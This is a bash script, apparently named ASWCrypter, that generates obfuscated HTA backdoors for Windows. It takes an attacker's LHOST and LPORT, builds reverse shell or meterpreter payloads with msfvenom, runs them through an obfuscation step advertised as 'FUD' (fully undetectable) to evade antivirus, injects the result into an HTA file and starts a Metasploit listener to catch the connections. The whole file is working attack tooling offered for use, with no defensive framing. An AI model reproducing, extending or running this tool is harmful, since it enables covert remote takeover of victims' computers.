OS=`uname` # grab OS
user=`who | awk {'print $1'}` 
distribution=`awk '{print $1}' /etc/issue` 
getPATH=`pwd` 

# check dependencies (msfconsole)
imp=`which msfconsole`
if [ "$?" -eq "0" ]; then
echo "[✔]msfconsole found" > /dev/null 2>&1
else
echo ""
echo "[X] msfconsole -> not found!"
echo "[!] This script requires msfconsole to work!"
sleep 2
exit
fi
  
# bash trap ctrl-c

trap ctrl_c INT
ctrl_c() {
echo "[+] CTRL+C PRESSED !"
sleep 1
echo "[+] Cleanning generated files..."

cd $getPATH && rm $getPATH/Base64 > /dev/null 2>&1 && rm $getPATH/shellWithNull > /dev/null 2>&1 && rm $getPATH/output/chars.raw > /dev/null 2>&1 && rm $getPATH/PayloadNametemp.hta > /dev/null 2>&1 && rm $getPATH/buildFrag > /dev/null 2>&1 && rm $getPATH/fragFile > /dev/null 2>&1 
cd $getPATH && rm $getPATH/fragFile > /dev/null 2>&1
cd $getPATH && rm $getPATH/buildFrag > /dev/null 2>&1

# exit ASWCrypter.sh
echo "[+] Exit Shellcode Generator..."
sleep 1
if [ "$distribution" = "Kali" ]; then
echo "[✔] Stop postgresql service.."

service postgresql stop > /dev/null 2>&1
else
echo "[✔] Stop metasploit service.."
/etc/init.d/metasploit stop > /dev/null 2>&1
fi
cd $getPATH
cd ..
sudo chown -hR $user shell > /dev/null 2>&1

ASWexit
exit
}

generateShell () {
# get user input to build shellcode
printf "[+]SET LHOST: "
read lhost
if [ "$?" -eq "0" ]; then
printf "[+]SET LPORT:"

read lport

clear;
echo "[+] Select an payload To start: "

# input payload choise
echo "
			[1] windows/shell_bind_tcp  
			[2] windows/shell/reverse_tcp 
			[3] windows/meterpreter/reverse_tcp [Recommended]
			[4] windows/meterpreter/reverse_tcp_dns 
			[5] windows/meterpreter/reverse_http   
			[6] windows/x64/meterpreter/reverse_tcp\n"
 
read -p "[!] Select an payload: " choice
case $choice in

1) paylo="windows/shell_bind_tcp" ;;
2) paylo="windows/shell/reverse_tcp";;
3) paylo="windows/meterpreter/reverse_tcp" ;;
4) paylo="windows/meterpreter/reverse_tcp_dns" ;;
5) paylo="windows/meterpreter/reverse_http" ;;
6) paylo="windows/x64/meterpreter/reverse_tcp";;
*) echo "\"$choice\": is not a valid Option"; sleep 2;;
esac
read -p "[!] Enter payload output name [example: HtaASCrypter]: " PayloadName

echo "Building shellcode ..."
sleep 2
xterm -T "SHELLCODE GENERATOR(ASWCrypter)" -geometry 100x50 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -i 43 -f hta-psh > $getPATH/output/chars.raw"
clear;
echo "Running a Python Script..."
sleep 2
store=`cat $getPATH/output/chars.raw | awk {'print $7'}`
getBase64=`echo $store | awk -F "," '{print $1}'| sed 's/.$//'`
echo $getBase64 > Base64
echo ""
sleep 2
#Run Python Script
python obfuscate.py

getShell=`cat buildFrag`
echo "Injecting shellcode -> $PayloadName.hta!"
 
sleep 3

mv bk.hta $getPATH/output/$PayloadName.hta > /dev/null 2>&1
sleep 1
sed "s|Fa0CB0Ok|$getShell|g" $getPATH/output/$PayloadName.hta > PayloadNametemp.hta
mv PayloadNametemp.hta $getPATH/output/$PayloadName.hta > /dev/null 2>&1
chown $user $getPATH/output/$PayloadName.hta > /dev/null 2>&1

# CHOSE Run multi-handler or NOT 
read -p "Do you want run multi-handler? [Y/N]: " serv
 

   if [ "$serv" = "y" ] || [ "$serv" = "Y" ] ; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[+] Start a multi-handler..."
      echo "[+] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 100x50 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
             
      sleep 2
   else
      ASWexit
   fi
 
else

  echo "[x] Abort module execution .."
  sleep 2
   
  clear
fi
}

ASWexit () {

echo "[✔] Stoping Services... OK"
sleep 1
if [ "$distribution" = "Kali" ]; then
service postgresql stop > /dev/null 2>&1
service apache2 stop > /dev/null 2>&1
else
/etc/init.d/metasploit stop > /dev/null 2>&1
/etc/init.d/apache2 stop  > /dev/null 2>&1
fi
cd $getPATH && rm $getPATH/Base64 > /dev/null 2>&1 && rm $getPATH/shellWithNull > /dev/null 2>&1 && rm $getPATH/output/chars.raw > /dev/null 2>&1 && rm $getPATH/PayloadNametemp.hta > /dev/null 2>&1 && rm $getPATH/buildFrag > /dev/null 2>&1 && rm $getPATH/fragFile > /dev/null 2>&1 
cd $getPATH && rm $getPATH/fragFile > /dev/null 2>&1
cd $getPATH && rm $getPATH/buildFrag > /dev/null 2>&1
cd ..
ASWhelp
exit

}

if [ $(id -u) != "0" ]; then
  echo "[x] we need to be root to run this script..."
  echo "[x] execute [ sudo ./ASWCrypter.sh ] on terminal"
  exit
else
  :
fi

clear
sleep 2
	if [ "$distribution" = "Kali" ]; then
	echo "[✔] Starting postgresql service... OK"
        sleep 1
	service postgresql start    > /dev/null 2>&1
	else
        sleep 1
	echo "[✔] Starting metasploit service... OK"
	/etc/init.d/metasploit start      > /dev/null 2>&1
        sleep 1
	fi
        sleep 1				
	echo "[✔] Shellcode Generator ... OK"
	sleep 1
        echo "[✔] Check User $user OK"
	echo "        [+] Choose option To start:"
        echo "
                           [G]Generate Backdoor [FUD]
                           [H]Help
                           [E]Exit                   
" 
	read -p "        [+] Enter Your Choose:" choice
	clear;
	case $choice in
	G) generateShell ;;
        g) generateShell ;;
	e) ASWexit ;;
	E) ASWexit ;;
        h) ASWhelp ;;
	H) ASWhelp ;;
	*) echo "\"$choice\": is not a valid Option"; sleep 2 ;;
	esac






